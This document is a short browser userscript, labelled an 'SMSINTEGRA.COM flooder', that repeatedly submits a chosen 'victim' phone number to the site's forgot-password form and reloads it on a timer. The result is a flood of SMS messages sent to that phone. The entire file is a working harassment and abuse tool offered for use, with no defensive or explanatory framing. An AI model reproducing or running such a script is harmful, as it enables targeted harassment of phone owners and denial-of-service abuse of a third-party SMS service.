// ==UserScript==>
// @name          Anonymous SMSINTEGRA.COM flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*smsintegra.com/*
// @credits       One
// ==/UserScript==

var victim=0 // enter numbers starting wit only 9
var delay=1000; // Enter delay in milliseconds if required

if(document.location=="http://www.smsintegra.com/forgetpwd.asp"||document.location=="http://www.smsintegra.com/forgetpwd.asp")
{
document.getElementById('phone').value=victim;
document.getElementById('Submit1').click();
}
if(document.location=="http://www.smsintegra.com/forgetpwd.asp?msg=1&ms=6"||document.location=="http://www.smsintegra.com/forgetpwd.asp?msg=1&ms=6")
setTimeout("document.location='http://www.smsintegra.com/forgetpwd.asp'",delay);
